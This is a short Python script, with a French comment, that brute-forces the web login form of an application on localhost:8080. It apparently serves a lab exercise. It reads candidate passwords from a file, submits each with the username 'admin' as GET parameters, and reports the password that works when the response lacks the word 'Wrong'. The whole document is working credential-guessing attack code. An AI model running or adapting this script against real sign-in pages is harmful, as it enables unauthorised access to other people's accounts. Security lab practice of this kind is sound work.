import requests

ip = "localhost"
port = "8080"
url = f"http://{ip}:{port}/" # L'URL de base
password_file = "passwords.txt"
username = "admin"
session = requests.Session()

def brute_force():
    with open(password_file, 'r') as file:
        for line in file:
            password = line.strip()
            params = {
                'page': 'signin',
                'username': username,
                'password': password,
                'Login': 'Login'
            }
            response = session.get(url, params=params, timeout=5)
            if "Wrong" not in response.text:
                print(f"\n[SUCCESS] Username: {username} | Password: {password}")
                return
            else:
                print(f"[-] Test: {password}", end="\r")

if __name__ == "__main__":
    brute_force()